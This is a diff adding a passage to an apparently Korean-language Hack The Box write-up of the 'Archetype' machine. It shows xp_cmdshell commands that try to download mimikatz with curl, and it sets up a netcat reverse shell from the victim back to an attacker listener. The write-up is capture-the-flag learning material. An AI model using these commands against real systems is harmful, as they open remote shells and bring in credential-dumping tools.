@@ -273,6 +273,27 @@ NULL
 PS C:\Windows\system32>
 ```
 
+mimikatz.exe를 다운로드하여 실행해보려 했으나 host 정보를 제대로 갖고오지 못하여 다른 방법을 찾아볼까 한다. -> HTB 문제는 기본적으로 외부와 접근이 되지 않는다고 한다.
+``` bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell curl -fsSL -O https://raw.githubusercontent.com/ParrotSec/mimikatz/blob/master/Win32/mimikatz.exe
+output
+-----------------------------------------------------------
+curl: (6) Could not resolve host: raw.githubusercontent.com
 
+NULL
+```
 
-10.129.215.129
+nc.exe를 대상 서버로 업로드하여 연결을 시도하였으나 실패하였다. 아래는 리버스쉘(서버->클라이언트 접속)을 사용하는 명령어이다.
+
+- Server 역할을 하는 공격자
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# nc -lvp 8000
+listening on [any] 8000 ...
+10.129.231.29: inverse host lookup failed: Unknown host
+connect to [10.10.14.175] from (UNKNOWN) [10.129.231.29] 49686
+```
+- Client 역할을 하는 희생자
+``` bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell C:/Users/Public/nc.exe 10.10.14.175 8000
+```
